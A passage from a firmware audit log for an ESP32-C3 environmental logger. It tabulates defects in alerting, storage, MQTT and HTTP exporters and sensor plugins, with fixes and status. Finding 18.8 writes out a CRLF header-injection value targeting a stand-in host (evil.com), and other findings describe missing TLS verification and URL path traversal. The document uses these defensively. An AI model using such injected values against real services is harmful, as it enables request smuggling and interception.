| 15.8 | H | AlertEngine.cpp:192-218 `_dispatch` — calls `g_mqttExporter->send(&ar, 1)` WHILE HOLDING `_mutex`. `send()` does TLS network I/O blocking seconds; violates the L185 contract "no blocking I/O". Also risks deadlock if MqttExporter ever takes its own mutex in evaluate path. | Queue the alert into a side ring; have a separate task drain it without holding _mutex. | Fixed (#90) |
| 15.9 | M | AlertEngine.cpp:402-406 `_save` — `_fs->open(_path, FILE_WRITE)` truncates immediately; non-atomic write. Power loss mid-save = corrupt alerts.json. No fsMutex either. Same class as 8.6 / 9.8 / 6.14. | Write to `.tmp`, then atomic rename. Acquire fsMutex around the open/serialize/close/rename block. | Fixed (#78) |
| 15.10 | M | AlertEngine.cpp:155-156 — `(rule.duration_s == 0) \|\| ((nowTs - rule.condFirstMetTs) >= rule.duration_s)`. When nowTs=0 (SensorTask fallback per 10.3) and condFirstMetTs=0, subtraction=0, condition immediately satisfied → false-positive trigger on pre-NTP readings. Tied to 11.4. | Skip evaluate when `nowTs < 1000000000` (no wall clock). | Pending |
| 15.11 | L | AlertEngine.cpp:69, 331 — `ALERT_MAX_RULES=8` silently truncates oversized rule arrays at parse. UI POST with 10 rules loses the 9th and 10th with no error. | Return false from fromJson when input exceeds cap; surface 413 to client. | Pending |
| 15.12 | M | AlertEngine.cpp:319-340 `fromJson` — sets `_ruleCount = 0` BEFORE parsing, then commits via `_save()`. If JSON body has missing/empty `rules` array (e.g. UI sends `{}`), ALL existing rules wiped without warning. No separate DELETE endpoint exists, so a malformed PUT body silently destroys the rules. | Parse into a temp `Rule[ALERT_MAX_RULES]`, only commit + save if successful AND newRuleCount > 0 (unless explicit `{"rules":[]}` opt-in). | Pending |

---

## Phase 16 — Storage Backends + RTC Driver

Files: `storage/CsvLogger.*`, `storage/HybridStorage.*`, `drivers/DS1302_Mini.h`

| # | Severity | Issue | Fix | Status |
|---|---|---|---|---|
| 16.1 | H | CsvLogger.cpp:67-76 `_rotate` — `_fs->remove(bak); _fs->rename(path, bak);` non-atomic. Power loss in the gap leaves NEITHER file present (primary CSV gone). Same class as 9.8, 12.11. | LittleFS rename overwrites atomically — drop the explicit `remove(bak)` call. | Fixed (#78) |
| 16.2 | M | HybridStorage entire module is DEAD CODE — `begin()`/`primary()`/`secondary()`/`mirrorWrite()` are never called from anywhere (verified via grep across src/ and ESP_Logger.ino). Mirror functionality lives instead in TaskManager.cpp:115-126. Module is linked into firmware (~2-3 KB flash bloat) and misleads maintainers into thinking it's the active mirror path. | Delete `src/storage/HybridStorage.*` OR wire it into TaskManager to replace the inline mirror block. | Fixed (#83) |
| 16.3 | L | HybridStorage.cpp:39 — `SD.begin(_sdCS)` with default `pinSdCS=10` collides with C3 SPI flash pin range (per 5.8). Dead code mitigates impact, but if revived would inherit 5.8. | Tied to 5.8; document or fix in tandem. | Fixed (#83) |
| 16.4 | L | HybridStorage.cpp:69-90 `mirrorWrite` — no `fsMutex` acquire; concurrent caller would race against StorageTask, ConfigManager, etc. Dead code today; flagged if revived. | Acquire fsMutex around the open/write/close blocks. | Fixed (#83) |
| 16.5 | L | DS1302_Mini.h:226 — `SetDateTime` writes `_dec2bcd(year - 2000)`. For year ≥ 2100, `(100/10)<<4 | 100%10 = 0xA0` is invalid BCD. DS1302 hardware behavior on invalid BCD is unspecified; may corrupt time. | Clamp year to 2000..2099, or return error for out-of-range. | Fixed (#85) |
| 16.6 | I | DS1302_Mini.h:137-159 — `writeByte`/`readByte` bit-banged at ~1 MHz (delayMicroseconds(1) per phase). Well within DS1302 max SCLK spec. Acceptable. | [No action] | N/A |
| 16.7 | I | CsvLogger.h / HybridStorage.h — trivial header surfaces; principal risk in `.cpp`. | [MODULE SAFE for headers beyond items above] | N/A |

---

## Phase 17 — Mini Drivers (MQTT, BME280, BME688, DS18B20)

Files: `drivers/MQTT_Mini.h`, `drivers/BME280_Mini.h`, `drivers/BME688_Mini.h`, `drivers/DS18B20_Mini.h`

| # | Severity | Issue | Fix | Status |
|---|---|---|---|---|
| 17.1 | M | MQTT_Mini.h:63 — On `remaining + 5 > sizeof(buf)` overflow, sets `_state=-4` and returns false WITHOUT calling `_tcp->stop()`. TCP connection to broker leaks; next connect attempt may collide. | Add `_tcp->stop();` before return false at L63. | Pending |
| 17.2 | H | MQTT_Mini.h — NO TLS support. Credentials + sensor data sent plaintext on port 1883. For non-LAN deployments (e.g. cloud broker over internet) every payload + auth is sniffable. | Add `WiFiClientSecure` variant + setCACert path; expose via setup.h flag `EXPORT_MQTT_TLS_ENABLED`. | Fixed (#91) |
| 17.3 | M | MQTT_Mini.h:98-105 — CONNACK wait blocks calling task up to 5 s (`delay(10)` × 500). Called from ExportTask normally (acceptable); if ever invoked from AsyncTCP worker (alert path 15.8) the whole web stalls. | Use non-blocking poll with FreeRTOS task yield; document the blocking contract on the function. | Pending |
| 17.4 | L | MQTT_Mini.h:122 — `publish()` accepts arbitrary uint16_t topic+payload lengths (up to 65 535). WiFiClient internal TCP buffer is typically 4-5 KB; oversized payload gets chunked but each `_tcp->write` may short-write. | Add `if (topicLen + payloadLen > 4096) return false;` guard. | Pending |
| 17.5 | M | BME280_Mini.h:36 — `while ((_read8(0xF3) & 0x01) != 0) delay(1);` — wait for NVM copy with NO timeout. If chip hangs (broken sensor, I2C noise), infinite loop hangs boot. | Add `for (int i = 0; i < 100; i++) { if (... == 0) break; delay(1); }` then return false on timeout. | Pending |
| 17.6 | M | BME280_Mini.h:66, 88 — `readPressure()` and `readHumidity()` rely on `_t_fine` set by previous `readTemperature()` call. No assertion or guard; out-of-order calls produce garbage values. Plugin code must always call temp first. | Make readPressure/Humidity call readTemperature internally if `_t_fine == 0`; or expose `readAll()` that sequences them. | Pending |
| 17.7 | L | BME280_Mini.h:160-204 — `_read8`/`_read16`/`_read24`/`_readBlock` discard `Wire.endTransmission()` return code AND don't verify `requestFrom` count matches. I2C error returns 0xFF on the bus → silently parsed as normal data. | Check `endTransmission != 0` and `requestFrom == len`; on error return sentinel NaN; have plugin convert to QUALITY_ERROR. | Pending |
| 17.8 | M | BME688_Mini.h:167-194 — Calibration register decoding uses magic indices into coeff1[]. Comments at L168-170 admit re-derivation from Bosch datasheet. No tests vs official BSEC reference; gas resistance compensation may be miscalculated for some sensors. | Cross-check every coefficient index against Bosch BME68x driver source; add a self-test against a known reading. | Pending |
| 17.9 | L | BME688_Mini.h:269-282 `_calcHeaterRes` — int32 intermediate arithmetic can overflow at max target temperature (400 °C). Bosch's own reference driver carries the same risk. Heater calibration may be off-by-N for high-temp settings. | Promote to int64 for the var2 calculation. | Pending |
| 17.10 | M | BME688_Mini.h:83-88 — `performReading` blocks up to 1 s polling status register. Plugin must declare `isBlocking()=true`; if not, SensorTask path stalls every other sensor. To verify in Phase 20. | Verify BME688Sensor::isBlocking() returns true. | Pending |
| 17.11 | H | DS18B20_Mini.h:134-143 `_readBit` — Critical timing window (`delayMicroseconds(3) + delayMicroseconds(10) + delayMicroseconds(53)`) executed WITHOUT `noInterrupts()` / `portDISABLE_INTERRUPTS()`. FreeRTOS scheduler tick (1 ms on ESP32-C3 default) preempting between assert and sample corrupts the bit → CRC failure at best, wrong temperature at worst. 1-Wire is timing-critical. | Wrap each `_writeBit`/`_readBit` (and ideally each 8-bit byte op) in `portDISABLE_INTERRUPTS()` / `portENABLE_INTERRUPTS()`. Note: also disables WiFi ISRs briefly; should be acceptable for ~70 μs windows. | Fixed (#93) |
| 17.12 | L | DS18B20_Mini.h:38 — Config register write `((res-9)&3)<<5 \| 0x1F` leaves bit 7 in a non-spec state (datasheet "reserved must be 1"). Most chips tolerate; some clones may not. | Use `0x9F` (sets bit 7) instead of `0x1F`. | Pending |
| 17.13 | M | DS1302_Mini.h ThreeWire — bit-banged access from multiple call sites (main loop, SensorTask, SlowSensorTask, StorageTask, WebServer handlers) with NO mutex protecting shared CE/IO/SCLK pins. Concurrent reads of the time registers can interleave at the bit level, returning garbage. Less critical than 17.11 (no scheduler-preemption hazard within a single read window because RTC reads are slow), but inter-task races corrupt the burst-read. | Add a `rtcMutex` semaphore; require every Rtc->* call to take it (timeout 100 ms). | Pending |
| 17.14 | L | MQTT_Mini.h general — Plain MQTT 3.1.1 publish-only; no SUBSCRIBE / SUB-ACK handling. Documented "publish-only" design. Future RPC features blocked. | Document explicitly in header. | N/A |
| 17.15 | I | Mini-driver headers are inline implementations; risk surface fully audited in this phase. Caller (plugin) must check return codes and call sequence. | [MODULE SAFE for headers beyond items above] | N/A |

---

## Phase 18 — Export Framework

Files: `export/IExporter.h`, `export/ExportManager.*`, `export/HttpExporter.*`

| # | Severity | Issue | Fix | Status |
|---|---|---|---|---|
| 18.1 | H | ExportManager.cpp:68-72 `_sendWithRetry` — exponential backoff: default 3 retries × 5 s base = 5+10+20 = **35 s blocking** per exporter. With 5 exporters enabled = up to **175 s blocked**. ExportTask heartbeat starves; C4 watchdog (30 s) fires false-positive reset. Tied to 11.8. | Cap total retry budget per sendAll call to ~15 s; refresh heartbeat between retries; or move retry to a state-machine across multiple ticks. | Fixed (#91) |
| 18.2 | M | ExportManager.cpp:165-176 `_drainSpool` — On a batched failure (line 165 break), spool file is preserved. Batches already successfully sent in earlier iterations are NOT removed from the file. Next drain re-reads same lines → duplicate sends. Non-idempotent exporters (HTTP POST with side effects) see duplicates. | Track byte offset of last successfully-sent line; rewrite spool with only un-sent tail; or use a 2-file rotation (in-flight / pending). | Pending |
| 18.3 | M | ExportManager.cpp:86-123 `_spoolBatch` — opens `/spool/<name>.jsonl` for append without `fsMutex`. Race against ConfigManager, StorageTask, RtcManager.backupBootCount, AlertEngine._save, etc. Same family as 8.8 / 9.9 / 9.12 / 12.10 / 15.9. | Acquire fsMutex around the open/write/close block. | Fixed (#79) |
| 18.4 | M | ExportManager.cpp:97-106 — Size-cap check then append is TOCTOU race. Two concurrent `_spoolBatch` calls can both pass the cap check and both append, exceeding MAX_SPOOL_BYTES. | Single read of file size under fsMutex; abort if over cap before opening for write. | Pending |
| 18.5 | L | ExportManager.cpp:114-117 `r[i].toJsonLine(line, sizeof(line))` — writes UNESCAPED strings (5.17). Sensor IDs containing `"` or `\` produce malformed JSON lines; later `_drainSpool::deserializeJson` (L152) silently drops them with `continue`. Data loss without user signal. | Fix 5.17 at SensorTypes.h level; or escape at toJsonLine call site here. | Pending |
| 18.6 | L | ExportManager.cpp:174 — `_spoolFS->remove(path);` no fsMutex. Race vs concurrent `_spoolBatch` append. | Acquire fsMutex around the remove call. | Fixed (#79) |
| 18.7 | L | IExporter.h:27-28 — `maxRetries() = 3`, `retryDelayMs() = 5000` as defaults. Combined with sequential per-exporter dispatch, cumulative blocking exceeds C4 watchdog window. Tuning required. | Defaults: `maxRetries=1`, `retryDelayMs=2000`. | Pending |
| 18.8 | H | HttpExporter.cpp:14-21 — User-supplied header values copied verbatim via `strncpy(_hdrVals[...], kv.value().as<const char*>() ?: "", ...)`. NO CRLF stripping. A platform_config.json entry like `"X-Foo":"a\r\nHost: evil.com"` injects extra headers into the outbound HTTPClient request → **HTTP header injection / request smuggling**. | Reject any header value containing `\r`, `\n`, or `\0`. | Fixed (#91) |
| 18.9 | H | HttpExporter.cpp:51 — `http.begin(_url)` accepts `https://` URLs but NO certificate verification configured. HTTPClient defaults to insecure mode in this construction; no `setCACert`/`setInsecure` exposed. **Plaintext credentials / MITM risk** on the exporter's HTTP traffic. Same applies to WebhookExporter, SensorCommunityExporter, OpenSenseMapExporter. | Add `setCACert` config option; or `setInsecure()` with an explicit opt-in macro for dev builds; fail closed by default on HTTPS URLs without cert. | Fixed (#91) |
| 18.10 | M | HttpExporter.cpp:33-35 — `new char[bodyLen]` without `std::nothrow`. On heap pressure → `bad_alloc` → abort. Same family as ApiHandlers.cpp:236. | `new(std::nothrow) char[bodyLen]`; on nullptr return false. | Pending |
| 18.11 | M | HttpExporter.cpp:42-46 — Body built via snprintf `%s` for sensorId/sensorType/metric/unit with NO JSON escaping. Same JSON injection class as 5.17 / 18.5. Malicious sensor id in platform_config.json corrupts the POST body. | JSON-escape strings before snprintf. | Pending |
| 18.12 | I | IExporter.h interface is clean; risk surface fully delegated to implementations. | [MODULE SAFE] | N/A |

---

## Phase 19 — Cloud Exporters (MQTT / Webhook / SensorCommunity / OpenSenseMap)

Files: `export/MqttExporter.*`, `export/WebhookExporter.*`, `export/SensorCommunityExporter.*`, `export/OpenSenseMapExporter.*`

| # | Severity | Issue | Fix | Status |
|---|---|---|---|---|
| 19.1 | M | MqttExporter.cpp:79-82 `send()` — On single-reading publish failure, sets `allOk=false` but CONTINUES publishing remaining readings, then returns false. ExportManager's retry path resends the WHOLE batch → already-published readings re-published. Idempotency violation. | On first failure: break early, mark allOk=false, return immediately. Caller's retry resends only unsent tail. | Pending |
| 19.2 | H | MqttExporter — Plaintext MQTT only (via MQTT_Mini at port 1883). Restates 17.2 from exporter perspective. Username/password sent in clear in CONNECT packet; subsequent PUBLISH payloads in clear. | Add TLS variant (WiFiClientSecure) for cloud broker deployments. | Fixed (#91) |
| 19.3 | M | MqttExporter.cpp:13-22 — `broker`/`topicPrefix`/`clientId`/`username`/`password` copied via strncpy from JSON without sanitization. CONNECT packet builder in MQTT_Mini reads these verbatim. A `topic_prefix` with `\0` or non-printable bytes corrupts every PUBLISH topic. | Reject non-printable chars (< 0x20 or 0x7F) in topic-related fields. | Pending |
| 19.4 | L | MqttExporter.cpp:166 — `_publishDiscoveryOne(s->getId(), s->getName(), mNames[m], "", dc)` passes **empty unit** literal. HA discovery payload omits `unit_of_measurement` → HA sensors render raw numbers without units. | Extend ISensor to expose getMetricUnit(metric) → pass it through to discovery. | Pending |
| 19.5 | L | MqttExporter.cpp:170 — `delay(20)` per metric publish during HA discovery. With 8 sensors × 4 metrics = 640 ms blocking. Runs once at boot via ESP_Logger.ino:442; OK there, but exposed via `/api/mqtt/ha_discovery` POST (ApiHandlers.cpp:438-449) where it blocks the AsyncTCP worker. | Replace `delay` with `vTaskDelay`; for the API path, schedule discovery to run from loop() via a flag. | Pending |
| 19.6 | L | WebhookExporter.cpp:18-19 — `condition` field defaults silently to `"above"` when not exactly `"above"` or `"below"`. A typo like `"abve"` is accepted with no validation error. | Reject unknown condition strings; return false from init() per IModule contract. | Pending |
| 19.7 | M | WebhookExporter.cpp:60-78 — Sequential HTTP POSTs blocking ExportTask. Multiple rule breaches in one batch fire sequentially; each POST blocks ~500 ms. C4 starvation amplified per 11.8. | Cap firings per batch to 1; queue rest for next sendAll cycle. | Pending |
| 19.8 | M | WebhookExporter.cpp:35-43 — Body built via snprintf `%s` for sensor_id/metric with NO JSON escaping. Same injection class as 18.11. | JSON-escape strings before snprintf. | Pending |
| 19.9 | H | WebhookExporter.cpp:31 — `http.begin(_url)` HTTPS with no cert verification. Same as 18.9. | Tied to 18.9. | Fixed (#91) |
| 19.10 | M | WebhookExporter as a whole — semantically OVERLAPS with AlertEngine (Phase 15). Two parallel threshold-alert systems with different storage (RAM rules in webhook config vs alerts.json), different delivery channels (HTTP-only here, MQTT/toast in alerts), and no coordination. Double-firing if same threshold set in both. Confusing UX. | Choose one canonical alert engine; refactor WebhookExporter to consume AlertEngine fired events via a hook. | Pending |
| 19.11 | H | SensorCommunityExporter.cpp:24 — `http.begin(API_URL)` HTTPS without cert verification. Same as 18.9. | Tied to 18.9. | Fixed (#91) |
| 19.12 | L | SensorCommunityExporter.cpp:47-54 — Picks the FIRST occurrence of each metric across all readings in the batch. Multi-sensor setups with two BME280s upload only one sensor's data. | Either upload each sensor as a separate POST, or aggregate (avg) across same-metric readings. | Pending |
| 19.13 | L | SensorCommunityExporter.cpp:80 — `pres * 100.0f` assumes plugin emits pressure in hPa. Plugin emitting Pa (BME280_Mini.h:85 returns Pa directly per Bosch formula) would be multiplied AGAIN by 100 → 100× wrong upload. Tied to 11.2 (no unit-aware contract). | Inspect r.unit and convert based on it; or document hPa requirement. | Pending |
| 19.14 | H | OpenSenseMapExporter.cpp:9, 73 — `access_token` stored plaintext in platform_config.json; sent in `Authorization: Bearer ...` header. Same `/export_settings` exposure as WiFi creds (3.7 family). Plus HTTPS to api.opensensemap.org without cert verification (18.9 family). Combined: token visible via /download AND vulnerable to MITM. | (a) Mask token in /export_settings response; (b) require explicit `?include_secrets=1` opt-in. (c) Add cert verification per 18.9. | Fixed (#91) |
| 19.15 | M | OpenSenseMapExporter.cpp:44-46 — `new char[bodyLen]` without `std::nothrow`. Same family as 18.10. | `new(std::nothrow)`. | Pending |
| 19.16 | L | OpenSenseMapExporter.cpp:67 — `snprintf(url, 128, "%s%s/data", API_BASE, _boxId);` — `_boxId` from user config is concatenated into URL path without validation. Malicious boxId like `abc/../../../other-box` could redirect uploads (HTTPClient may or may not normalize). | Validate _boxId against `^[a-f0-9]{24}$` (openSenseMap ID format). | Pending |
| 19.17 | I | All exporter `init()` paths copy raw user-supplied strings into char arrays via strncpy without explicit NUL termination — works only because the receiving buffers are zero-initialized at declaration. Brittle if a future refactor adds non-trivial constructors. | Add explicit `_buf[sizeof(_buf)-1] = '\0';` after every strncpy. | Pending |

---

## Phase 20 — Environmental Sensor Plugins (BME280 / BME688 / DS18B20)

Files: `sensors/plugins/BME280Sensor.*`, `BME688Sensor.*`, `DS18B20Sensor.*`

| # | Severity | Issue | Fix | Status |
|---|---|---|---|---|
| 20.1 | M | BME280Sensor.cpp:12-16 + BME688Sensor.cpp:12 (+ all I2C plugins) — Every sensor's `init()` calls `Wire.begin(sda, scl)` if pins are specified. If two sensors in platform_config.json specify **different** SDA/SCL, the LAST init wins; previously-initialised sensors now address the wrong bus. Bus reconfiguration race. | Centralise I2C bus setup once at boot (e.g. `HardwareManager::initI2C` reading first sensor's pins); plugins should NOT call Wire.begin themselves. | Pending |
| 20.2 | M | BME688Sensor.cpp:47 — `if (!_ready \|\| maxOut < 4) return 0;` — strict 4-metric requirement. Caller with maxOut=3 (e.g. when one slot was used by another sensor in the same tick) drops ALL data instead of returning the 3 available. Wastes the entire forced-mode read. | Write up to `min(4, maxOut)` metrics; return that count. | Pending |
| 20.3 | M | DS18B20Sensor.cpp:36 — `_ready = true` set when `count == 0` with comment "bus may have device connect later." False premise: `DS18B20_Mini._count` is set ONLY inside `begin()`. Hot-plugged sensors are never detected without a manual re-init. Comment misleads. | Either remove the "_ready=true" path (return false on no devices), OR add a `rescan()` method called periodically by readAll. | Pending |
| 20.4 | L | BME280Sensor.cpp:62 vs 71-73 — Inconsistent use of `_makeReading` helper at L62-63 vs direct `SensorReading::make` at L71-73. Maintainer confusion; both produce the same output today. | Use one pattern. | Pending |
| 20.5 | L | DS18B20Sensor.cpp:59-60 — `requestTemperatures(); delay(conversionTimeMs());` blocks SlowSensorTask up to 760 ms. Acceptable per `isBlocking()=true`, but the subsequent `getTempC()` reads in `DS18B20_Mini` carry the 17.11 noInterrupts timing risk. | Tied to 17.11; fix in driver level. | Pending |
| 20.6 | I | All I2C sensor plugins rely on SensorManager wrapping their reads with `wireMutex` (15.4 family). `init()` paths run at boot single-threaded (loadAndInit calls per sensor sequentially) so init-time bus access is safe; runtime reads are guarded by SensorManager. OK. | [Acceptable] | N/A |
| 20.7 | I | Headers (BME280Sensor.h, BME688Sensor.h, DS18B20Sensor.h) — trivial declarations + getMetrics with static const arrays returned. | [MODULE SAFE for headers] | N/A |

---

## Phase 21 — Air Quality Sensor Plugins (SDS011 / PMS5003 / ENS160 / SGP30)

Files: `sensors/plugins/SDS011Sensor.*`, `PMS5003Sensor.*`, `ENS160Sensor.*`, `SGP30Sensor.*`

| # | Severity | Issue | Fix | Status |
|---|---|---|---|---|
| 21.1 | H | SDS011Sensor.cpp:26 + PMS5003Sensor.cpp:15 — BOTH set `_serial = &Serial1` and call `Serial1.begin(baud, SERIAL_8N1, rx, tx)`. ESP32-C3 has only ONE hardware UART besides USB-CDC (Serial1). If user enables both in platform_config.json, the second init reconfigures Serial1 (different baud and pins), **silently breaking the first**. Same UART cannot serve two devices simultaneously. | Mutually exclusive: refuse to register the second if the first is already on Serial1; OR document UART-share limitation in INSTRUCTIONS.md. | Fixed (#93) |
| 21.2 | M | SDS011Sensor.cpp:67-74 `_drainBuffer` — 100 ms busy loop in `init()` (called at boot from `_initPlatform`). Combined with other sensor init delays, contributes to multi-second boot stretch BEFORE OtaManager::tick begins (compounds 1.14 / 8.10 / 9.x ordering risks). | Replace `delay(10)` with `vTaskDelay`; cap drain at 50 ms. | Pending |
| 21.3 | L | SDS011Sensor.cpp:37-45 — Hardware Working Period config command sent fire-and-forget; NO ACK frame check. Sensor may silently refuse to switch modes; user thinks `work_period_min=5` is active when sensor stays continuous. | Read response frame within 1 s; verify checksum + work-period byte; log warning on mismatch. | Pending |
| 21.4 | L | SDS011Sensor.cpp:36-45 — Command checksum sums bytes 2..16 (line 38-39) per Nova Fitness spec. Buffer initializer at L37 sets cmd[17] to 0 but is then OVERWRITTEN by checksum at L40. Correct, but the read-once initializer is dead. Cosmetic. | Drop the `0` placeholder in initializer (use `{}` rest). | Pending |
| 21.5 | M | PMS5003Sensor.cpp:28-39 `_readFrame` — 2 s deadline loop with `delay(5)` and NO `g_taskHeartbeat[TASK_IDX_SLOW_SENSOR]` refresh. SDS011's L115 DOES refresh during a similar wait. Inconsistent; if MAX_SILENCE_MS were ever tightened below 30 s, PMS5003 reads would trip the C4 watchdog. | Add `g_taskHeartbeat[TASK_IDX_SLOW_SENSOR] = millis();` at top of the loop body. | Pending |
| 21.6 | M | ENS160Sensor.cpp:64-81 `readAll` — Does NOT call `_waitReady` (NEW_DATA bit) before reading TVOC/eCO2 registers. If sensor isn't fully ready (warmup, transient), reads stale/garbage values that pass `isPlausible` (tvoc 0..65535, eco2 400..65535). | Call `_waitReady(200)` at top; on failure return 0; OR mark readings as QUALITY_ESTIMATED. | Pending |
| 21.7 | L | ENS160Sensor.cpp:79 — AQI emitted as float with unit "". ProcessingTask `isPlausible` has no AQI check → catch-all returns true. Garbage AQI (>5) passes validation and reaches AlertEngine. | Add bounds check `if (aqi < 1 \|\| aqi > 5)` → mark QUALITY_ERROR; add `aqi` case to ProcessingTask.isPlausible. | Pending |
| 21.8 | L | SGP30Sensor.cpp:43-78 `init` — Sequence: get_feat → IAQ_INIT. After IAQ_INIT, first 15 s of readings are baseline-only. Class correctly marks these as `QUALITY_ESTIMATED` (L96). But the comment in the header (L11-13) says "first 15 readings return baseline" — at 30 s interval, that's 7.5 minutes of estimated readings. Doc/code mismatch. | Update comment: "First reading after init returns estimated; switches to GOOD after 15 s warmup elapses." | Pending |
| 21.9 | M | SGP30Sensor.cpp:33-41 `_measure` — On I2C failure (single transient noise byte → CRC mismatch in `_readWords`), returns false → `readAll` returns 0. NO retry within one call. Combined with SensorTask interval, one transient noise burst skips an entire 30 s cycle. | Retry once after 10 ms on CRC failure. | Pending |
| 21.10 | L | SDS011Sensor.cpp:113-115 — `g_taskHeartbeat[TASK_IDX_SLOW_SENSOR] = millis();` manual refresh inside `read()` and `readAll()` blocking waits. Direct write to a global volatile array from sensor plugin code violates encapsulation (the heartbeat is a TaskManager concern). Acceptable today since plugins know they're on SlowSensorTask. | Provide a `SensorPlatform::tickHeartbeat()` helper that hides the array. | Pending |
| 21.11 | I | All UART/I2C plugin headers — trivial declarations, static metric arrays, calibration members. | [MODULE SAFE for headers] | N/A |

---

## Phase 22 — CO2 & Light Sensor Plugins (SCD4x / VEML6075 / VEML7700 / BH1750)

Files: `sensors/plugins/SCD4xSensor.*`, `VEML6075Sensor.*`, `VEML7700Sensor.*`, `BH1750Sensor.*`

| # | Severity | Issue | Fix | Status |
|---|---|---|---|---|
| 22.1 | H | SCD4xSensor.cpp:63-69 — `_sendCmd(CMD_START_PERIODIC); delay(5100);` blocks 5.1 s in `init()`. With 4+ sensors at staggered init delays, total boot time can exceed OtaManager::boot arm window (tied to 1.14 / 8.10). Pending-verify firmware that crashes before sensor init finishes never gets rolled back. | Don't `delay(5100)` — set `_ready=false` and let first readAll's `_dataReady()` gate. Or move OtaManager::boot earlier per 1.14. | Fixed (#93) |
| 22.2 | M | SCD4xSensor.cpp:70 — `_ready = true` set after CMD_START_PERIODIC send succeeds with NO confirmation the device is actually in periodic mode. Subsequent `_dataReady()` may always return false; reads silently fail. | After init delay, check `_dataReady()`; refuse to mark `_ready=true` on failure. | Pending |
| 22.3 | M | SCD4xSensor.cpp:94 — `co2 = _calCo2.apply((float)words[0]);` — raw uint16 (0..65535) silently accepted. SCD40 max 2000 ppm, SCD41 max 5000 ppm. ProcessingTask `isPlausible` has no `co2` case (11.1) → garbage reaches AlertEngine. | Range-check `400 <= words[0] <= 5000`; add co2 to isPlausible (fix 11.1 in tandem). | Pending |
| 22.4 | H | VEML6075Sensor.h:51 + VEML7700Sensor.h:55 — BOTH use I2C ADDR=0x10 (fixed, no override). The two cannot coexist on the same bus. No conflict detection; user enabling both gets silent device-confusion (whichever device ACKs the address services every read/write). | Reject second plugin registration with the same fixed address; surface via Serial + sensor.status="error". | Fixed (#93) |
| 22.5 | M | VEML7700Sensor.cpp:97 + L100-106 — `lux = _calLux.apply(als * _resolution)` at L97. Then L100-104 high-lux non-linear correction recomputes from the already-calibrated value, and L105 calls `_calLux.apply(lux)` AGAIN. Result: calibration **offset added twice, scale squared** for lux > 1000. | Apply non-linear correction to raw `als*_resolution` BEFORE calibration: `if (rawLux > 1000) rawLux = poly(rawLux); lux = _calLux.apply(rawLux);`. | Pending |
| 22.6 | M | VEML7700Sensor.cpp:90-95 — `readAll` bails on ANY register read failure (line 94 or 95 returns 0). Single transient I2C error skips a whole 5 s read cycle. Same class as 21.9 / 22.x. | Retry once after 10 ms before bailing. | Pending |
| 22.7 | L | VEML6075Sensor.cpp:39-42 — Device-ID mismatch logged but ignored ("continue anyway — some modules don't expose ID"). Allows misconfigured sensors at other addresses to silently report garbage. | Make strict-ID opt-out via config flag (default opt-IN). | Pending |
| 22.8 | L | BH1750Sensor.cpp:42-49 — `_sendCmd(CMD_RESET)` and `_sendCmd(_modeCmd)` return values DISCARDED. If RESET or mode-set fails after POWER_ON, init proceeds and `_ready=true`. First read may return garbage. | Check returns; on any failure return false. | Pending |
| 22.9 | I | All Phase-22 plugins call `Wire.begin(sda, scl)` in init — inherits 20.1 race. | See 20.1. | N/A |
| 22.10 | I | SCD4xSensor.h, VEML6075Sensor.h, VEML7700Sensor.h, BH1750Sensor.h — trivial declarations + static metric arrays. | [MODULE SAFE for headers beyond items above] | N/A |

---

## Phase 23 — Flow & Weather Sensor Plugins (WaterFlow / YFS201 / Rain / Wind)

Files: `sensors/plugins/WaterFlowSensor.*`, `YFS201Sensor.h`, `RainSensor.*`, `WindSensor.*`

| # | Severity | Issue | Fix | Status |
|---|---|---|---|---|
| 23.1 | C | RainSensor.cpp:24 + RainSensor.h:44 — Default `_pin=9` with `pinMode(_pin, INPUT_PULLUP)`. **GPIO9 is an ESP32-C3 boot-strap pin** — held LOW at power-on selects SPI download mode. A typical tipping-bucket reed switch pulls to GND when closed; if the bucket happens to be in the tipped state at power-on, the device boots into download mode → soft-brick until next manual reboot. | Change default `_pin` to a non-strap GPIO (e.g. 4 or 10); document strap-pin avoidance prominently in INSTRUCTIONS.md and the sensor schema. | Fixed (#87) |
| 23.2 | M | YFS201Sensor module is DEAD CODE — ESP_Logger.ino:387-388 registers `"yfs201"` via the `WaterFlowSensor` factory lambda, NOT `YFS201Sensor`. The module is linked into firmware and misleads future maintainers. | Delete `src/sensors/plugins/YFS201Sensor.*`. | Fixed (#83) |
| 23.3 | H | RainSensor.cpp:25-28 + WindSensor.cpp:30-33 — Same `gpio_isr_handler_add(pin, _isr, this)` without destructor cleanup as 2.6. `SensorManager::reloadConfig → _destroyAll → delete _sensors[i]` frees the object; next pulse fires the IRAM ISR on a dangling `this` → crash. Extends 2.6 to two more sensor classes. | Add `~RainSensor()` / `~WindSensor()` calling `gpio_isr_handler_remove((gpio_num_t)_pin);`. | Fixed (#81) |
| 23.4 | M | WindSensor.cpp:61 — `delay(_sampleWindowMs)` defaults to 3000 ms; `getReadIntervalMs() = _sampleWindowMs`. Net duty cycle = 100% — SlowSensorTask spends every 3 s blocked on wind reads, starving SDS011/PMS5003 (same task). | Decouple sample window from poll interval (e.g. sample 1× per 30 s), or cap window at 1 s default. | Pending |
| 23.5 | M | WindSensor.cpp:53-86 — `_pulses = 0` at L58 then `delay(3000)` at L61 with interrupts ENABLED, then `count = _pulses` at L64. A pulse arriving between L64 read and L72 use is NOT counted in THIS sample but will be the next. Subtle off-by-one drift in continuous wind. | Acceptable for low-precision wind; document or use atomic snapshot at start AND end of window. | Pending |
| 23.6 | L | WindSensor.cpp:76 — `analogRead(_dirPin)` single sample mapped directly to angle. Noisy ADC produces jittery wind direction. | 8-sample average; or median-of-3. | Pending |
| 23.7 | L | RainSensor.cpp:54-55 — Instantaneous `rain_rate` computed from a single inter-tip interval. One tip in 30 min produces SAME rate as 3 tips in 30 min. | Accumulate tip count over a rolling window; `rate = window_tips × mm_per_tip × (3600 / window_sec)`. | Pending |
| 23.8 | I | WaterFlowSensor.cpp:39-41 — ISR install pattern flagged in 2.6 / 17.x; restated as the 23.3 fix scope must also include WaterFlowSensor's destructor. | See 2.6 / 23.3. | Pending |
| 23.9 | I | All ISR-driven sensors share the static-bool `_isrServiceInstalled` pattern (WaterFlow L39, Rain L26, Wind L31). Idempotent install across plugins. OK. | [Acceptable] | N/A |
| 23.10 | I | WaterFlowSensor.h / YFS201Sensor.h / RainSensor.h / WindSensor.h — trivial declarations beyond items above. | [MODULE SAFE for headers beyond 23.x findings] | N/A |

---

## Phase 24 — Distance / Soil / AC-Power Sensor Plugins (HC-SR04 / Soil / ZMPT101B / ZMCT103C)

